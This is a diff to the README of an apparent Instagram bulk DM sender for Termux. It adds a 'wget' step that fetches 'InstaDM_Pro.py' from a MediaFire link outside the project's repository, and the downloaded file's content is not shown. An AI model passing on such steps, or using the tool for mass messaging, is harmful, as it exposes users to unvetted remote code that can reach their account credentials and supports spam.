@@ -1,4 +1,3 @@
-# ![Marketing T3ch](https://yourlogo-url.com/animated-logo.gif)
 
 # Instagram DMs Sender (Fast & Secure)
 
@@ -23,11 +22,12 @@
 pkg update && pkg upgrade -y
 pkg install python -y
 pkg install git
+pkg install wget
 pkg install python libjpeg-turbo libpng freetype -y
 git clone https://github.com/MarketingT3ch/MarketingT3ch-IG-Messenger.git
 cd MarketingT3ch-IG-Messenger
+wget https://download851.mediafire.com/xkafz5c7f9pgReIf5BelEsh2Hg7wfQfFb7vpTu2URMuSL4r1h1-6Cgp21hS7dkm2bKYI_RjaKAV0W53hR-57wColwaptqFtiZpq9NAhkbo5U8yK0-mG8EH2bygoZC__DCxqZ79N4ZwVwvwlcURNlK1HSmUjO7e4cXmHSvVf12O3GPIU/jwp2agms0q69bun/InstaDM_Pro.py
 ```
-
 ### **Step 2: Install Dependencies**
 ```sh
 pip install -r requirements.txt
